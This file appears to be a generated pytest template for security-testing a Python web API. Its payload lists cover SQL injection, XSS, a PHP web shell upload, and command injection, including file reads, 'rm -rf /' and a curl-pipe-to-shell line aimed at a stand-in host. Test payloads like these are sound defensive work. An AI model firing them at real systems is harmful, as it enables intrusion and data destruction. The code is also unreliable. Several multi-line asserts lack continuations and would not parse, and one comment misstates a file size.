#!/usr/bin/env python3
"""
File: security-tests.tpl.py
Purpose: Template for unknown implementation
Generated for: {{PROJECT_NAME}}
"""

# -----------------------------------------------------------------------------
# FILE: security-tests.tpl.py
# PURPOSE: Security testing patterns for Python projects
# USAGE: Test application security vulnerabilities and protections
# DEPENDENCIES: pytest, pytest-asyncio, httpx, bandit, safety, requests
# AUTHOR: [[.Author]]
# VERSION: [[.Version]]
# SINCE: [[.Version]]
# -----------------------------------------------------------------------------

"""
Python Security Tests Template
Purpose: Security testing patterns for Python projects
Usage: Test application security vulnerabilities and protections
"""

import pytest
import asyncio
import httpx
import re
import json
import base64
from unittest.mock import Mock, AsyncMock, patch
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
import hashlib
import secrets
from fastapi.testclient import TestClient

# Import your application modules here
# from your_app.main import app
# from your_app.auth import AuthService
# from your_app.security import SecurityConfig

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of default event loop for test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="function")
def security_client():
    """Create HTTP client for security testing"""
    return httpx.AsyncClient(
        timeout=30.0,
        follow_redirects=False
    )

class TestAuthenticationSecurity:
    """Test authentication security vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_weak_password_protection(self, security_client: httpx.AsyncClient):
        """Test protection against weak passwords"""
        weak_passwords = [
            "password", "123456", "qwerty", "admin", "letmein",
            "password123", "123456789", "welcome", "monkey"
        ]
        
        for weak_password in weak_passwords:
            # Act - Attempt registration with weak password
            response = await security_client.post("/api/auth/register", json={
                "email": "test@example.com",
                "password": weak_password,
                "first_name": "Test",
                "last_name": "User"
            })
            
            # Assert - Weak password should be rejected
            assert response.status_code in [400, 422], 
                f"Weak password '{weak_password}' should be rejected"
            
            error_response = response.json()
            assert "password" in str(error_response).lower() or "weak" in str(error_response).lower(),
                "Error message should indicate weak password"
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, security_client: httpx.AsyncClient):
        """Test protection against brute force attacks"""
        # Act - Attempt multiple failed logins
        failed_attempts = 0
        
        for i in range(20):  # 20 failed attempts
            response = await security_client.post("/api/auth/login", json={
                "email": "test@example.com",
                "password": f"wrong_password_{i}"
            })
            
            if response.status_code == 401:
                failed_attempts += 1
            
            # Add small delay to simulate real brute force
            await asyncio.sleep(0.1)
        
        # Assert - Account should be locked after failed attempts
        assert failed_attempts >= 10, "Should have multiple failed attempts"
        
        # Act - Try correct password after lockout
        response = await security_client.post("/api/auth/login", json={
            "email": "test@example.com",
            "password": "correct_password"
        })
        
        # Assert - Account should be locked
        assert response.status_code == 423, "Account should be locked after brute force"
        
        error_response = response.json()
        assert "locked" in str(error_response).lower() or "try again later" in str(error_response).lower(),
                "Error message should indicate account locked"
    
    @pytest.mark.asyncio
    async def test_session_security(self, security_client: httpx.AsyncClient):
        """Test session security implementation"""
        # Act - Login to get session
        login_response = await security_client.post("/api/auth/login", json={
            "email": "test@example.com",
            "password": "correct_password"
        })
        
        assert login_response.status_code == 200
        session_token = login_response.json()["access_token"]
        
        # Assert - Session token should be JWT
        try:
            # JWT tokens have 3 parts separated by dots
            parts = session_token.split('.')
            assert len(parts) == 3, "Session token should be JWT format"
            
            # Decode header (first part)
            header = json.loads(base64.b64decode(parts[0] + '=='))
            assert "alg" in header, "JWT should have algorithm"
            assert "typ" in header, "JWT should have type"
        except:
            pytest.fail("Session token format validation failed")
        
        # Act - Test session expiration
        expired_token = "expired.jwt.token"
        response = await security_client.get("/api/users/profile", headers={
            "Authorization": f"Bearer {expired_token}"
        })
        
        # Assert - Expired token should be rejected
        assert response.status_code == 401, "Expired session token should be rejected"
    
    @pytest.mark.asyncio
    async def test_csrf_protection(self, security_client: httpx.AsyncClient):
        """Test CSRF protection implementation"""
        # Act - Attempt request without CSRF token
        response = await security_client.post("/api/protected-action", json={
            "action": "sensitive_operation",
            "data": "test_data"
        })
        
        # Assert - Request without CSRF should be rejected
        assert response.status_code in [403, 419], "Request without CSRF should be rejected"
        
        error_response = response.json()
        assert "csrf" in str(error_response).lower() or "forbidden" in str(error_response).lower(),
                "Error message should indicate CSRF protection"

class TestInputValidationSecurity:
    """Test input validation security"""
    
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self, security_client: httpx.AsyncClient):
        """Test SQL injection protection"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for payload in sql_injection_payloads:
            # Act - Attempt SQL injection in login
            response = await security_client.post("/api/auth/login", json={
                "email": payload,
                "password": "password"
            })
            
            # Assert - SQL injection should be blocked
            assert response.status_code in [400, 401, 403], 
                f"SQL injection payload should be blocked"
            
            # Verify no database error leaked
            response_text = response.text.lower()
            assert "sql" not in response_text or "error" not in response_text,
                "Database errors should not be exposed"
    
    @pytest.mark.asyncio
    async def test_xss_protection(self, security_client: httpx.AsyncClient):
        """Test XSS protection"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            # Act - Attempt XSS in user profile
            response = await security_client.put("/api/users/profile", json={
                "bio": payload,
                "display_name": payload
            }, headers={"Authorization": "Bearer valid_token"})
            
            # Assert - XSS should be sanitized or blocked
            assert response.status_code in [200, 400, 422], 
                f"XSS payload should be handled safely"
            
            if response.status_code == 200:
                profile_data = response.json()
                # Verify XSS is sanitized
                assert "<script>" not in profile_data.get("bio", ""),
                    "Script tags should be removed"
                assert "javascript:" not in profile_data.get("display_name", ""),
                    "JavaScript protocols should be removed"
    
    @pytest.mark.asyncio
    async def test_file_upload_security(self, security_client: httpx.AsyncClient):
        """Test file upload security"""
        malicious_files = [
            {"name": "malicious.php", "content": "<?php system($_GET['cmd']); ?>", "content_type": "application/x-php"},
            {"name": "script.js", "content": "alert('xss')", "content_type": "application/javascript"},
            {"name": "large_file.txt", "content": "A" * 10000000, "content_type": "text/plain"},  # 100MB file
            {"name": "executable.exe", "content": b"fake_exe_content", "content_type": "application/x-executable"}
        ]
        
        for malicious_file in malicious_files:
            # Act - Attempt upload of malicious file
            files = {
                "file": (malicious_file["name"], malicious_file["content"], malicious_file["content_type"])
            }
            
            response = await security_client.post("/api/upload", files=files, 
                headers={"Authorization": "Bearer valid_token"})
            
            # Assert - Malicious files should be blocked
            assert response.status_code in [400, 413, 422], 
                f"Malicious file {malicious_file['name']} should be blocked"
            
            error_response = response.json()
            assert any(keyword in str(error_response).lower() 
                    for keyword in ["malicious", "blocked", "invalid", "too large"]),
                    "Error should indicate file rejection"
    
    @pytest.mark.asyncio
    async def test_command_injection_protection(self, security_client: httpx.AsyncClient):
        """Test command injection protection"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl malicious.com | sh"
        ]
        
        for payload in command_injection_payloads:
            # Act - Attempt command injection in system operation
            response = await security_client.post("/api/system/execute", json={
                "command": f"ls {payload}",
                "directory": "/tmp"
            }, headers={"Authorization": "Bearer valid_token"})
            
            # Assert - Command injection should be blocked
            assert response.status_code in [400, 403, 422], 
                f"Command injection payload should be blocked"
            
            error_response = response.json()
            assert any(keyword in str(error_response).lower() 
                    for keyword in ["invalid", "blocked", "forbidden", "malicious"]),
                    "Error should indicate command injection protection"

class TestAPISecurity:
    """Test API security implementations"""
    
    @pytest.mark.asyncio
    async def test_rate_limiting_security(self, security_client: httpx.AsyncClient):
        """Test rate limiting security implementation"""
        # Act - Exceed rate limit rapidly
        responses = []
        
        for i in range(100):  # 100 rapid requests
            response = await security_client.get("/api/sensitive-data")
            responses.append(response)
            
            # Small delay to simulate rapid requests
            await asyncio.sleep(0.01)
        
        # Assert - Rate limiting should be enforced
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "Rate limiting should be enforced"
        
        # Check rate limit headers
        if rate_limited_responses:
            headers = rate_limited_responses[0].headers
            assert "x-ratelimit-remaining" in headers, "Rate limit headers should be present"
            assert "x-ratelimit-reset" in headers, "Rate limit reset time should be present"
    
    @pytest.mark.asyncio
    async def test_security_headers(self, security_client: httpx.AsyncClient):
        """Test security headers are properly set"""
        # Act - Make request to test headers
        response = await security_client.get("/api/test-endpoint")
        
        # Assert - Required security headers present
        required_headers = {
            "x-content-type-options": "nosniff",
            "x-frame-options": ["DENY", "SAMEORIGIN"],
            "x-xss-protection": ["1; mode=block", "0"],
            "strict-transport-security": ["max-age=31536000; includeSubDomains"],
            "content-security-policy": ["default-src 'self'"]
        }
        
        for header_name, expected_values in required_headers.items():
            assert header_name in response.headers, f"Security header {header_name} missing"
            
            header_value = response.headers[header_name]
            assert any(expected in header_value for expected in expected_values), \
                f"Security header {header_name} has incorrect value: {header_value}"
    
    @pytest.mark.asyncio
    async def test_cors_configuration(self, security_client: httpx.AsyncClient):
        """Test CORS configuration security"""
        # Test preflight request
        preflight_response = await security_client.options("/api/test-endpoint", headers={
            "Origin": "https://malicious.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type"
        })
        
        # Assert - CORS should restrict origins
        assert preflight_response.status_code in [400, 403], 
            "CORS should restrict unauthorized origins"
        
        # Test actual request with unauthorized origin
        response = await security_client.get("/api/test-endpoint", headers={
            "Origin": "https://malicious.com"
        })
        
        # Assert - Unauthorized origin should be rejected
        assert "access-control-allow-origin" not in response.headers, \
            "CORS should not allow unauthorized origins"
    
    @pytest.mark.asyncio
    async def test_api_versioning_security(self, security_client: httpx.AsyncClient):
        """Test API versioning security"""
        # Act - Test with deprecated API version
        response = await security_client.get("/api/v1/sensitive-data", 
                headers={"Authorization": "Bearer valid_token"})
        
        # Assert - Deprecated version should be handled securely
        assert response.status_code != 500, "Deprecated API should not cause server error"
        
        # Check for deprecation warnings
        if response.status_code == 200:
            assert "deprecated" in response.headers.get("warning", "").lower() or \
                   "deprecated" in response.text.lower(), \
                   "Deprecated API should warn about deprecation"
    
    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self, security_client: httpx.AsyncClient):
        """Test sensitive data exposure prevention"""
        # Act - Request various endpoints that might expose sensitive data
        endpoints_to_test = [
            "/api/users",
            "/api/config",
            "/api/environment",
            "/api/logs",
            "/api/database-info",
            "/api/system-info"
        ]
        
        for endpoint in endpoints_to_test:
            response = await security_client.get(endpoint, 
                    headers={"Authorization": "Bearer valid_token"})
            
            # Assert - Sensitive data should not be exposed
            if response.status_code == 200:
                data = response.json()
                
                # Check for sensitive information
                sensitive_patterns = [
                    r'password', r'secret', r'key', r'token', r'credential',
                    r'private_key', r'database', r'connection_string',
                    r'api_key', r'admin', r'root'
                ]
                
                data_string = json.dumps(data).lower()
                for pattern in sensitive_patterns:
                    assert not re.search(pattern, data_string), \
                        f"Sensitive pattern '{pattern}' found in {endpoint} response"

class TestAuthorizationSecurity:
    """Test authorization security"""
    
    @pytest.mark.asyncio
    async def test_role_based_access_control(self, security_client: httpx.AsyncClient):
        """Test role-based access control"""
        # Test endpoints with different user roles
        test_cases = [
            {"role": "user", "endpoint": "/api/user/profile", "should_access": True},
            {"role": "user", "endpoint": "/api/admin/users", "should_access": False},
            {"role": "admin", "endpoint": "/api/admin/users", "should_access": True},
            {"role": "guest", "endpoint": "/api/user/profile", "should_access": False}
        ]
        
        for test_case in test_cases:
            # Act - Get token for specific role
            token = await self._get_token_for_role(test_case["role"], security_client)
            
            # Test access to endpoint
            response = await security_client.get(test_case["endpoint"], 
                    headers={"Authorization": f"Bearer {token}"})
            
            # Assert - Access control enforced correctly
            if test_case["should_access"]:
                assert response.status_code == 200, \
                    f"Role {test_case['role']} should access {test_case['endpoint']}"
            else:
                assert response.status_code in [401, 403, 404], \
                    f"Role {test_case['role']} should not access {test_case['endpoint']}"
    
    @pytest.mark.asyncio
    async def test_resource_ownership_security(self, security_client: httpx.AsyncClient):
        """Test resource ownership security"""
        # Act - Create resource as user1
        user1_token = await self._get_token_for_user("user1@example.com", security_client)
        
        create_response = await security_client.post("/api/documents", json={
            "title": "User1 Document",
            "content": "Sensitive content"
        }, headers={"Authorization": f"Bearer {user1_token}"})
        
        assert create_response.status_code == 201
        document_id = create_response.json()["id"]
        
        # Act - Try to access resource as user2
        user2_token = await self._get_token_for_user("user2@example.com", security_client)
        
        access_response = await security_client.get(f"/api/documents/{document_id}", 
                    headers={"Authorization": f"Bearer {user2_token}"})
        
        # Assert - User2 should not access User1's document
        assert access_response.status_code in [403, 404], 
            "User should not access another user's resource"
        
        # Act - User1 should still access their document
        user1_access_response = await security_client.get(f"/api/documents/{document_id}", 
                    headers={"Authorization": f"Bearer {user1_token}"})
        
        assert user1_access_response.status_code == 200, 
            "User should access their own resource"
    
    async def _get_token_for_role(self, role: str, client: httpx.AsyncClient) -> str:
        """Helper to get token for specific role"""
        # This would normally authenticate as a user with the specified role
        # For testing, we'll use mock tokens
        role_tokens = {
            "user": "user.jwt.token",
            "admin": "admin.jwt.token", 
            "guest": "guest.jwt.token"
        }
        return role_tokens.get(role, "user.jwt.token")
    
    async def _get_token_for_user(self, email: str, client: httpx.AsyncClient) -> str:
        """Helper to get token for specific user"""
        # This would normally authenticate the specific user
        # For testing, we'll use mock tokens
        return f"token.for.{email.replace('@', '.').replace('.', '')}"

class TestEncryptionSecurity:
    """Test encryption security implementations"""
    
    @pytest.mark.asyncio
    async def test_password_encryption_strength(self, security_client: httpx.AsyncClient):
        """Test password encryption and hashing strength"""
        # Act - Test password reset functionality
        reset_response = await security_client.post("/api/auth/reset-password", json={
            "email": "test@example.com"
        })
        
        assert reset_response.status_code == 200
        
        # Verify reset token is properly generated
        reset_data = reset_response.json()
        reset_token = reset_data.get("reset_token", "")
        
        # Assert - Reset token should be cryptographically secure
        assert len(reset_token) >= 32, "Reset token should be sufficiently long"
        assert reset_token.isalnum(), "Reset token should use alphanumeric characters"
        
        # Act - Test password update with new password
        new_password = "NewSecurePassword123!"
        update_response = await security_client.post("/api/auth/update-password", json={
            "token": reset_token,
            "new_password": new_password,
            "confirm_password": new_password
        })
        
        assert update_response.status_code == 200
        
        # Verify password is properly hashed (can't directly test, but check response doesn't expose password)
        update_data = update_response.json()
        assert new_password not in str(update_data), "Password should not be exposed in response"
    
    @pytest.mark.asyncio
    async def test_data_encryption_in_transit(self, security_client: httpx.AsyncClient):
        """Test data encryption in transit"""
        # Act - Make request to HTTPS endpoint
        response = await security_client.get("https://api:8000/sensitive-data", 
                    headers={"Authorization": "Bearer valid_token"})
        
        # Assert - HTTPS should be enforced
        # Note: In test environment, this might not be actual HTTPS
        # But we can check for security headers indicating HTTPS requirement
        
        security_headers = response.headers
        assert "strict-transport-security" in security_headers, \
            "HSTS header should be present for HTTPS enforcement"

class TestSecurityLogging:
    """Test security logging and monitoring"""
    
    @pytest.mark.asyncio
    async def test_security_event_logging(self, security_client: httpx.AsyncClient):
        """Test security events are properly logged"""
        # Act - Trigger security events
        security_events = [
            # Failed login attempts
            {"action": "login", "data": {"email": "test@example.com", "password": "wrong"}},
            # Unauthorized access attempts
            {"action": "access_protected", "endpoint": "/api/admin", "token": "invalid"},
            # Suspicious activity
            {"action": "sql_injection_attempt", "payload": "'; DROP TABLE users; --"},
            # Privilege escalation attempts
            {"action": "privilege_escalation", "target": "admin", "method": "parameter_pollution"}
        ]
        
        for event in security_events:
            if event["action"] == "login":
                response = await security_client.post("/api/auth/login", json=event["data"])
            elif event["action"] == "access_protected":
                response = await security_client.get(event["endpoint"], 
                        headers={"Authorization": f"Bearer {event['token']}"})
            elif event["action"] == "sql_injection_attempt":
                response = await security_client.post("/api/auth/login", json={
                    "email": event["payload"],
                    "password": "password"
                })
            elif event["action"] == "privilege_escalation":
                response = await security_client.post("/api/users/update", json={
                    "user_id": 1,
                    "role": event["target"],
                    f"{event['method']}": "admin"
                }, headers={"Authorization": "Bearer valid_token"})
            
            # Assert - Security event logged (would check logs in real system)
            # For testing, we verify the response doesn't leak sensitive info
            assert response.status_code in [400, 401, 403, 422], 
                f"Security event {event['action']} should be handled securely"
    
    @pytest.mark.asyncio
    async def test_intrusion_detection(self, security_client: httpx.AsyncClient):
        """Test intrusion detection mechanisms"""
        # Act - Simulate suspicious activity patterns
        suspicious_patterns = [
            # Rapid failed logins from same IP
            {"pattern": "rapid_failed_logins", "count": 10, "timeframe": 60},
            # Requests from suspicious locations
            {"pattern": "geographic_anomaly", "locations": ["CN", "RU", "KP"]},
            # Unusual user agent patterns
            {"pattern": "user_agent_anomaly", "agents": ["sqlmap", "nikto", "burp"]},
            # Timing-based attacks
            {"pattern": "timing_attack", "requests": 100, "interval": 0.1}
        ]
        
        for pattern in suspicious_patterns:
            if pattern["pattern"] == "rapid_failed_logins":
                # Simulate rapid failed logins
                for i in range(pattern["count"]):
                    response = await security_client.post("/api/auth/login", json={
                        "email": "test@example.com",
                        "password": f"wrong_{i}"
                    })
                    assert response.status_code == 401
                    
                    # Small delay between attempts
                    await asyncio.sleep(0.1)
                
                # Final attempt should trigger detection
                response = await security_client.post("/api/auth/login", json={
                    "email": "test@example.com",
                    "password": "correct_password"
                })
                
                # Should be blocked due to suspicious activity
                assert response.status_code in [403, 429], 
                    "Suspicious activity should be detected and blocked"
            
            elif pattern["pattern"] == "user_agent_anomaly":
                # Test with suspicious user agents
                for agent in pattern["agents"]:
                    response = await security_client.get("/api/test", 
                            headers={"User-Agent": agent})
                    
                    # Suspicious user agents should be flagged
                    assert response.status_code in [403, 406], 
                        f"Suspicious user agent {agent} should be blocked"

if __name__ == "__main__":
    pytest.main([
        __file__, 
        "-v", 
        "--cov=your_app", 
        "--cov-report=html",
        "--cov-report=term-missing",
        "-m security"  # Run security tests
    ])